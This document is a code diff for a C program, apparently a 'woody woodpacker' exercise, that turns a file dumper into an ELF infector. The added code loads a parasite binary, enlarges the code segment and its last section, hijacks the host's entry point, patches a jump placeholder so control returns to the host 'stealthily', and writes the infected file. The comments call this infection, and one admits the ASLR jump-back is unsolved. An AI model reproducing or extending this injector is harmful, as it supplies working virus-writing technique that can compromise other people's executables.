@@ -1,187 +1,284 @@
 #include "wwp.h"
-void lafonction(void);
-extern u_int32_t lasize;
+#include "color.h"
+
+/********************  ALGORITHM   *********************
+
+
+--- Load parasite from file into memory
+1.	Get parasite_size and parasite_code addresss (location in allocated memory)
+
+
+--- Find padding_size between CODE segment and the NEXT segment after CODE segment
+2.	CODE segment : increase
+		-> p_filesz 		(by parasite size)
+		-> p_memsz 			(by parasite size)
+	Get and Set respectively,	
+	padding_size 	= (offset of next segment (after CODE segment)) - (end of CODE segment)
+	parasite_offset = (end of CODE segment) or (end of last section of CODE segment)
+
+
+---	PATCH Host entry point
+3.	Save original_entry_point (e_entry) and replace it with parasite_offset
+
+
+--- PATCH SHT
+4.  Find the last section in CODE Segment and increase - 
+        -> sh_size          (by parasite size)
+
+
+--- PATCH Parasite offset
+5.	Find and replace Parasite jmp exit addresss with original_entry_point 0x????????
+
+
+---	Inject Parasite to Host @ host_mapping
+6.	Inject parasite code to (host_mapping + parasite_offset)
+
+
+7.	Write infection to disk x_x
+
+*/
+
+Elf64_Addr		parasite_load_address;			// parasite entry point (if parasite is LSB EXEC)
+Elf64_Off		parasite_offset;				// Parasite entry point (if parasite is .so)
+u_int64_t		parasite_size;					
+int8_t			*parasite_code;					// Parasite residence (in memory before meeting its host )
+
+Elf64_Addr		original_entry_point;			// Host entry point
+Elf64_Off		code_segment_end_offset;		// Location to inject parasite
+u_int64_t   		host_file_size;					// Host binary size (on disk)
+
+int				HOST_IS_EXECUTABLE 		= 0;	// Host is LSB Executable
+int 			HOST_IS_SHARED_OBJECT 	= 0;	// Host is a Shared Object
+
+// Finds the placeholder (for address where our parasite code will jump after executing its body) and
+// writes the host's entry point (original entry point address) to it. This should silently transfer
+// the code flow to the original intended code after the parasite body executes.
+void mFindAndReplace(u_int8_t *parasite, long find_value, long replace_value)
+{
+	u_int8_t *ptr = parasite;
+	
+
+	int i	= 0;
+	for (i=0 ; i < parasite_size ; ++i)
+	{
+		long current_QWORD = *((long *)(ptr + i));
+		
+		if ( !(find_value ^ current_QWORD) ) 
+		{
+			*((long *)(ptr + i)) = replace_value;
+			return;
+		}
+	}
+}
+
+// Patch SHT (i.e. find the last section of CODE segment and increase its size by parasite_size)
+void mPatchSHT(void *map_addr)
+{
+	Elf64_Ehdr	*elf_header 	= (Elf64_Ehdr *) map_addr;
+	
+	
+	Elf64_Off	sht_offset 		= elf_header->e_shoff;
+	u_int16_t	sht_entry_count	= elf_header->e_shnum;
+    Elf64_Off	current_section_end_offset;
+
+
+    // Point shdr (Pointer to iterate over SHT) to the last entry of SHT
+    Elf64_Shdr *section_entry = (Elf64_Shdr *) (map_addr + sht_offset);
+
+
+    int i;
+    for ( i=0 ; i < sht_entry_count ; ++i )
+    {
+		current_section_end_offset = section_entry->sh_offset + section_entry->sh_size;
+
+        if ( code_segment_end_offset == current_section_end_offset) {
+
+            // This is the last section of CODE Segment
+			// Increase the sizeof this section by a parasite_size to accomodate parasite
+            section_entry->sh_size = section_entry->sh_size + parasite_size;
+			return;
+		} 
+    // Move to the next section entry
+    ++section_entry;
+    }
+}
+
+// Returns gap size (accomodation for parasite code in padding between CODE segment and next segment 
+// after CODE segment) 
+Elf64_Off mGetPaddingSize(void *host_mapping)
+{   
+	Elf64_Ehdr *elf_header 		= (Elf64_Ehdr *) host_mapping;
+	u_int16_t pht_entry_count 	= elf_header->e_phnum;
+	Elf64_Off pht_offset 		= elf_header->e_phoff;
+
+
+	// Point to first entry in PHT
+	Elf64_Phdr *phdr_entry = (Elf64_Phdr *)(host_mapping + pht_offset);
+
+
+	// Parse PHT entries
+	u_int16_t CODE_SEGMENT_FOUND = 0;
+	int i;
+	for ( i = 0 ; i < pht_entry_count ; ++i)
+	{
+		// PF_X	(1 << 0)
+		// PF_W	(1 << 1)
+		// PF_R (1 << 2)
+		// Find the CODE Segment (containing .text section)
+		if (CODE_SEGMENT_FOUND  == 0		&&
+			phdr_entry->p_type  == PT_LOAD	&&
+			phdr_entry->p_flags == (PF_R | PF_X) )
+		{
+
+			CODE_SEGMENT_FOUND = 1;
+
+			// Calculate the offset where the code segment ends to bellow calculate padding_size 
+			code_segment_end_offset	= phdr_entry->p_offset + phdr_entry->p_filesz;
+			parasite_offset			= code_segment_end_offset;
+			parasite_load_address	= phdr_entry->p_vaddr  + phdr_entry->p_filesz;
+
+
+			// Increase its p_filesz and p_memsz by parasite_size (to accomodate parasite)
+			phdr_entry->p_filesz = phdr_entry->p_filesz + parasite_size;
+			phdr_entry->p_memsz  = phdr_entry->p_memsz  + parasite_size;
+        
+		}
+
+		
+		// Find next segment after CODE Segment and calculate padding size
+		if (CODE_SEGMENT_FOUND  == 1		&&
+			phdr_entry->p_type  == PT_LOAD	&&
+			phdr_entry->p_flags == (PF_R | PF_W))
+		{
+			// Return padding_size (maximum size of parasite that host can accomodate in its 
+			// padding between the end of CODE segment and start of next loadable segment)
+			return (phdr_entry->p_offset - parasite_offset);
+		}
+
+
+        ++phdr_entry;	
+	}
+
+	return 0;
+}
+
+// Loads parasite code into memory and defines parasite_code and parasite_size variables
+void mLoadParasite(char *parasite_path)
+{
+	
+	// Open parasite code
+	int parasite_fd = open(parasite_path, O_RDONLY);
+	if (parasite_fd == -1)
+	{
+		printf("[-] In evil_elf.c - mLoadParasite(), open():");
+		exit(0x60);
+	}
+
+
+	// Get the parasite_size using lstat() syscall
+	struct stat statbuf;
+	if ( lstat(parasite_path, &statbuf) != 0 )
+	{
+		printf("[-] In evil_elf.c - mLoadParasite(), lstat():");
+		exit(0x61);		
+	} 
+
+
+	// Initializing parasite_size and allocating space for parasite_code
+	parasite_size = statbuf.st_size;
+	parasite_code = (int8_t *)malloc(parasite_size);
+	if (parasite_code == NULL)
+	{
+		fprintf(stderr, "[-] evil_elf.c, InjectParasiteCode() : Out of memory\n");
+		exit(0x61);
+	}
+
+
+	// Load actual poison @ parasite_code (allocated memory on heap)
+	int bytes_read = read(parasite_fd, parasite_code, parasite_size);
+	if (bytes_read == -1)
+	{
+		printf(RED"[-]"RESET" In evil_elf.c, mLoadParasite() - read():");
+		exit(0x62);
+	}
+
+	close(parasite_fd);
+}
 
 int			write_woody(char *ptr, off_t size)
 {
 	(void)size;
 
-	Elf64_Ehdr	*ehdr = (Elf64_Ehdr*)ptr;
-	Elf64_Shdr	*shdr = (Elf64_Shdr *)(ptr + ehdr->e_shoff);
-	Elf64_Phdr	*phdr = (Elf64_Phdr*)(ptr + ehdr->e_phoff);
-	int shnum = ehdr->e_shnum;
-	int phnum = ehdr->e_phnum;
-	// int the_place = 0;
+	// Identify the binary & SKIP Relocatable, files and 32-bit class of binaries
+	Elf64_Ehdr *host_header = (Elf64_Ehdr *) ptr;
+    if ( host_header->e_type == ET_REL ||
+         host_header->e_type == ET_CORE ) return 0;
+	else if ( host_header->e_type == ET_EXEC ){	HOST_IS_EXECUTABLE = 1; HOST_IS_SHARED_OBJECT = 0;}
+	else if ( host_header->e_type == ET_DYN  ){	HOST_IS_SHARED_OBJECT = 1; HOST_IS_EXECUTABLE = 0;}
+    if ( host_header->e_ident[EI_CLASS] == ELFCLASS32 ) return 0;
 
-	printf("entry point => %llx\n", ehdr->e_entry);
-
-	Elf64_Shdr *sh_strtab = &shdr[ehdr->e_shstrndx];
-	const char *const sh_strtab_p = ptr + sh_strtab->sh_offset;
 	
-	printf("shnum -> [%d]\n", shnum);
-	printf("phnum -> [%d]\n", phnum);
+	// Load Parasite into memory (from disk), uses extern 'parasite_path_for_exec' defined in main.c implicitly
+	if 		(HOST_IS_EXECUTABLE) 	mLoadParasite("./obj/ASM/exec_parasite.bin");
+	else if (HOST_IS_SHARED_OBJECT) mLoadParasite("./obj/ASM/so_parasite.bin");
+
+	if 		(HOST_IS_EXECUTABLE) 	printf("parasite_path_for_exec\n");
+	else if (HOST_IS_SHARED_OBJECT) printf("parasite_path_for_so\n");
 
 
-    printf("\n[00]:  <  virtual addr  > <  size  > \"name\"\n");
-
-
-    // #########################################################################################################################################
-    // #########################################################################################################################################
-    // #########################################################################################################################################
-
-	for (int i = 0; i < shnum; ++i)
+	// Get Home size (in bytes) of parasite residence in host
+	// and check if host's home size can accomodate a parasite this big in size
+	Elf64_Off padding_size = mGetPaddingSize(ptr);
+	if (padding_size < parasite_size)
 	{
-    	// printf("[%2d]: <%16x> <%16x> \"%s\"\n", i, u16s(phdr[i].p_vaddr), u16s(phdr[i].p_paddr), sh_strtab_p + shdr[i].sh_name);
-    	printf("[%2d]:  <%016llx> <%08llx> \"%s\"\n", i, shdr[i].sh_addr, shdr[i].sh_size, sh_strtab_p + shdr[i].sh_name);
-		// if (!ft_strcmp((char*)(sh_strtab_p + shdr[i].sh_name), ".text"))
-		// {
-		// 	printf("found .text -> [%2d] addr <%016llx>\n", i, shdr[i].sh_addr);
-		// }
+		fprintf(stderr, RED"[+]"RESET" Host "YELLOW"%s"RESET" cannot accomodate parasite, parasite is angry "RED"x_x \n"RESET, "le fichier"); 
+		return 0;
 	}
-
-    // #########################################################################################################################################
-    // #########################################################################################################################################
-    // #########################################################################################################################################
- 	
- 	Elf64_Phdr* segaddr;
- 	int end_text_addr;
-    int ptr_begin_text_origin;
-	for (int i = 0; i < phnum; ++i)
-	{
-		printf("[%2d] [%d]\n", i , phdr[i].p_flags);
-		if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags & 0x011)
-		{
-			printf("text found -> %d\n", i);
-			ptr_begin_text_origin = i;
-			segaddr = &phdr[i];
-			// end_text_addr = phdr[i].p_vaddr + phdr[i].p_memsz;
-			end_text_addr = phdr[i].p_offset + phdr[i].p_filesz;
-			printf("off %llx size %llx\n", phdr[i].p_offset, phdr[i].p_filesz);
-		}
-	}
-
-	printf("addr de debut -> <%p>\n", segaddr);
-	printf("addr de fin   -> <%p>\n", ptr + end_text_addr);
-	printf("addr de fin   -> <%x>\n", end_text_addr);
-
-
-    // #########################################################################################################################################
-    // #########################################################################################################################################
-    // #########################################################################################################################################
 	
 
-	// int			nfd;
-	// struct stat	buf2;
-	// char		*asmptr;
+	// Save original_entry_point of host and patch host entry point with parasite_offset
+	original_entry_point 		= host_header->e_entry; 
+	if (HOST_IS_EXECUTABLE)
+		host_header->e_entry 	= parasite_load_address;
+	else if (HOST_IS_SHARED_OBJECT)
+		host_header->e_entry 	= parasite_offset;
 
 
-	// if ((nfd = open("obj/ASM/payload.o", O_RDONLY)) < 0)
-	// 	return (1);
-	// if (fstat(nfd, &buf2) < 0)
-	// 	return (1);
-	// if (S_ISDIR(buf2.st_mode))
-	// {
-	// 	ft_printfd(2, "%s is a directory\n", "obj/ASM/payload.o");
-	// 	return (1);
-	// }
-	// if ((asmptr = mmap(0, buf2.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, nfd, 0))
-	// 	== MAP_FAILED)
-	// 	return (1);
+	// Patch SHT
+	mPatchSHT(ptr);
 
-    // #########################################################################################################################################
-    // #########################################################################################################################################
- //    // #########################################################################################################################################
-	
-	// Elf64_Ehdr	*ehdr2 = (Elf64_Ehdr*)asmptr;
-	// Elf64_Shdr	*shdr2 = (Elf64_Shdr *)(asmptr + ehdr2->e_shoff);
 
-	// Elf64_Shdr *sh_strtab2 = &shdr2[ehdr2->e_shstrndx];
-	// const char *const sh_strtab_p2 = asmptr + sh_strtab2->sh_offset;
+	// ?????????????????????????????????????????????????????????????????????????????????????????????
+	// Patch Parasite jmp-on-exit address. This step causing SIGSEGV. Since nearly all binaries are
+	// in the form of shared objects (which uses offsets instead of absolute addresses), we need to
+	// figure out the runtime address (rather than offset) of the first instruction the host 
+	// originally intended to execute at RUNTIME. This has to be calculated by our parasite code at
+	// RUNTIME since all modern systems come with mitigation called ASLR due to which the binary has
+	// a different runtime address each time it is loaded into memory.
+	// POSSIBLE Solution -  Parasite should include code that figures out what base address is the 
+	//						binary alloted at runtime so that it transfers the code back to the host
+	//						stealthily.						
+	if (HOST_IS_EXECUTABLE) mFindAndReplace(parasite_code, 0xAAAAAAAAAAAAAAAA, original_entry_point);
+	else if (HOST_IS_SHARED_OBJECT) {
+		// Different case for SO - In case our parasite has more placeholders for so infection.
+		mFindAndReplace(parasite_code, 0xAAAAAAAAAAAAAAAA, original_entry_point);
+	}
+		
+	// ????????????????????????????????????????????????????????????????????????????????????????????
 
-	// printf("\nle mechant\n");
-	// int ptr_begin_text;
-	// for (int i = 0; i < shnum; ++i)
-	// {
- //    	// printf("[%2d]: <%16x> <%16x> \"%s\"\n", i, u16s(phdr2[i].p_vaddr), u16s(phdr2[i].p_paddr), sh_strtab_p2 + shdr2[i].sh_name);
- //    	printf("[%2d]:  <%016llx> <%08llx> \"%s\"\n", i, shdr2[i].sh_addr, shdr2[i].sh_size, sh_strtab_p2 + shdr2[i].sh_name);
-	// 	if (!ft_strcmp((char*)(sh_strtab_p2 + shdr2[i].sh_name), ".text"))
-	// 	{
-	// 		ptr_begin_text = i;
-	// 		printf("found .text -> [%2d] addr <%016llx>\n", i, shdr2[i].sh_addr);
-	// 	}
-	// }
-	// printf("evidemment\n");
-	// (void)ptr_begin_text;
-	// printf("voila\n");
 
-    // #########################################################################################################################################
-    // #########################################################################################################################################
-    // #########################################################################################################################################
-
+	// Inject parasite in Host
+	ft_memmove( (ptr + parasite_offset), parasite_code, parasite_size);
+	//DumpMemory(ptr + parasite_offset, parasite_size);
 	int fd;
 	if ((fd = open("woody", O_WRONLY | O_CREAT | O_TRUNC, 0644)) == -1)
 		return (1);
-
-    // #########################################################################################################################################
-    // #########################################################################################################################################
-    // #########################################################################################################################################
-
-/*
-	printf("addr -> {%016llx}\n", shdr2[ptr_begin_text].sh_addr);
-	printf("addr -> {%p}\n", asmptr + shdr2[ptr_begin_text].sh_addr);
-	printf("addr -> {%p}\n", &shdr2[ptr_begin_text]);
-	
-	u_int64_t old_one = ((phdr[ptr_begin_text_origin].p_vaddr + phdr[ptr_begin_text_origin].p_memsz - ehdr->e_entry) * (-1));
-	ft_memcpy(asmptr + 0x1019, &old_one, 8);
-
-	// ft_memcpy(asmptr + 0x1019, &ehdr->e_entry, 8);
-  	// my_elfi_mem_subst (ptr + end_text_addr, shdr2[ptr_begin_text].sh_size, 0x11111111, (long)ehdr->e_entry);
-
-	printf("old entry point => %llx\n", ehdr->e_entry);
-	printf("his old entry point => %llx\n", (phdr[ptr_begin_text_origin].p_vaddr + phdr[ptr_begin_text_origin].p_memsz - ehdr->e_entry) * (-1));
-	ehdr->e_entry = (Elf64_Addr)(end_text_addr);
-	printf("new entry point => %llx\n", ehdr->e_entry);
-
-	phdr[ptr_begin_text_origin].p_filesz += shdr2[ptr_begin_text].sh_size;
-	phdr[ptr_begin_text_origin].p_memsz += shdr2[ptr_begin_text].sh_size;
-
-	// shdr[15].sh_size += shdr2[ptr_begin_text].sh_size;
-
-	ft_memmove(ptr + 0x11db, "lol", 3);
-	ft_memmove(ptr + end_text_addr, asmptr + shdr2[ptr_begin_text].sh_offset, shdr2[ptr_begin_text].sh_size);
-	ft_memcpy(ptr + 0x2008, "Joie ", 5);
-
-*/
-    // #########################################################################################################################################
-    // #########################################################################################################################################
-    // #########################################################################################################################################
-
-	printf("%d\n", ptr_begin_text_origin);
-
-	// ft_memmove(asmptr + 0x25d, &ehdr->e_entry, 8);
-
-	printf("%p <=> %llx\n", &ehdr->e_entry, ehdr->e_entry);
-	// ehdr->e_entry = (Elf64_Addr)(end_text_addr);
-	// phdr[ptr_begin_text_origin].p_filesz += lasize;
-	// phdr[ptr_begin_text_origin].p_memsz += lasize;
-	// shdr[15].sh_size += lasize;
-
-
-	// write(fd, ptr, size);
-	write(fd, ptr, end_text_addr);
-	write(fd, &lafonction, lasize);
-	// write(fd, "lol", 3);
-	write(fd, ptr + end_text_addr + lasize, (size - end_text_addr - lasize));
-
-
-
-    // #########################################################################################################################################
-    // #########################################################################################################################################
-    // #########################################################################################################################################
-
-	// if (munmap(asmptr, buf2.st_size) < 0)
-	// 	return (1);
-	// close(nfd);
+	write(fd, ptr, size);
 	close(fd);
+
+
+	// DEBUG
+	// fprintf(stdout, BLUE"[+]"RED" Infected x_x"RESET"  :  "GREEN"%s\n"RESET, filepath);
+
 	return 0;
 }
